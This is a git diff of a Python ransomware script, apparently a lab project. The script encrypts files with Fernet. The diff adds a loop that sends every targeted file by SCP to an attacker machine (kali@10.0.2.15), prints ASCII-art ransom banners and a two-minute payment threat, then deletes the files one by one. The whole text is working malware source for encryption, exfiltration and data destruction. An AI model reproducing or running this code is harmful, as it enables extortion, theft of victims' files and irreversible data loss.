@@ -2,6 +2,8 @@
 
 from cryptography.fernet import Fernet
 import os
+import time
+import subprocess
 
 #find files
 
@@ -30,9 +32,38 @@ for file in  files:
         with open(file, "wb") as thefile:
              thefile.write(contents_encrypted)
 
+# exfiltrate files using SCP
+             
+for file in files:
+    source_file = file
+    destination_ip = "10.0.2.15"  # Replace with the actual IP
+    destination_username = "kali"  # Replace with the actual username
+    destination_path = "/home/kali/Desktop/exfildata/"  # Location to exfiltrate data
 
+    subprocess.run(["scp", source_file, f"{destination_username}@{destination_ip}:{destination_path}"])
+    print(f"File {file} exfiltrated using SCP")
 
 # ransom note
+
+ascii_dedops = """
+                                                                              
+                                      ,----..                                 
+    ,---,                            /   /   \                                
+  .'  .' `\                  ,---,  /   .     : ,-.----.                      
+,---.'     \               ,---.'| .   /   ;.  \\    /  \                     
+|   |  .`\  |              |   | :.   ;   /  ` ;|   :    |  .--.--.           
+:   : |  '  |   ,---.      |   | |;   |  ; \ ; ||   | .\ : /  /    '          
+|   ' '  ;  :  /     \   ,--.__| ||   :  | ; | '.   : |: ||  :  /`./          
+'   | ;  .  | /    /  | /   ,'   |.   |  ' ' ' :|   |  \ :|  :  ;_            
+|   | :  |  '.    ' / |.   '  /  |'   ;  \; /  ||   : .  | \  \    `.         
+'   : | /  ; '   ;   /|'   ; |:  | \   \  ',  / :     |`-'  `----.   \        
+|   | '` ,/  '   |  / ||   | '/  '  ;   :    /  :   : :    /  /`--'  /        
+;   :  .'    |   :    ||   :    :|   \   \ .'   |   | :   '--'.     /         
+|   ,.'       \   \  /  \   \  /      `---`     `---'.|     `--'---'          
+'---'          `----'    `----'                   `---`                       
+"""
+
+print(ascii_dedops)  
 
 ascii_note = r"""
  _ _   _    _ _                                _       _          _     
@@ -61,28 +92,9 @@ ascii_note = r"""
 """
 print(ascii_note)
 
-ascii_dedops = """
-                                                                              
-                                      ,----..                                 
-    ,---,                            /   /   \                                
-  .'  .' `\                  ,---,  /   .     : ,-.----.                      
-,---.'     \               ,---.'| .   /   ;.  \\    /  \                     
-|   |  .`\  |              |   | :.   ;   /  ` ;|   :    |  .--.--.           
-:   : |  '  |   ,---.      |   | |;   |  ; \ ; ||   | .\ : /  /    '          
-|   ' '  ;  :  /     \   ,--.__| ||   :  | ; | '.   : |: ||  :  /`./          
-'   | ;  .  | /    /  | /   ,'   |.   |  ' ' ' :|   |  \ :|  :  ;_            
-|   | :  |  '.    ' / |.   '  /  |'   ;  \; /  ||   : .  | \  \    `.         
-'   : | /  ; '   ;   /|'   ; |:  | \   \  ',  / :     |`-'  `----.   \        
-|   | '` ,/  '   |  / ||   | '/  '  ;   :    /  :   : :    /  /`--'  /        
-;   :  .'    |   :    ||   :    :|   \   \ .'   |   | :   '--'.     /         
-|   ,.'       \   \  /  \   \  /      `---`     `---'.|     `--'---'          
-'---'          `----'    `----'                   `---`                       
-"""
-
-print(ascii_dedops)                                                           
-
+                                                          
 ascii_art = """
-  ⣿⣿⣿⣿⣿⠟⠋⠉⠀⠀⣀⠈⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠉⠈⣀⠀⠀⠉⠙⠿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⠟⠋⠉⠀⠀⣀⠈⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠉⠈⣀⠀⠀⠉⠙⠿⣿⣿⣿⣿⣿
 ⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠉⠙⠓⢶⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣥⡶⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿
 ⣿⣿⣿⢁⣀⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⣀⡘⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
@@ -112,3 +124,20 @@ ascii_art = """
 """
 
 print(ascii_art)
+
+print("You have 2 minutes to pay ransom! Else an file will be destroyed in 60 seconds!!!")
+
+# set time for file deletion (e.g., 10 seconds)
+time.sleep(120)
+
+# delete individual files
+for file in files:
+    try:
+        os.remove(file)
+        print(f"File {file} is gone :((((((((")
+        # Introduce a delay (e.g., 1 second) between deletions
+        time.sleep(60)
+    except Exception:
+        pass # Passes as file already deleted
+
+print("Too slow your data is gone!!!!")
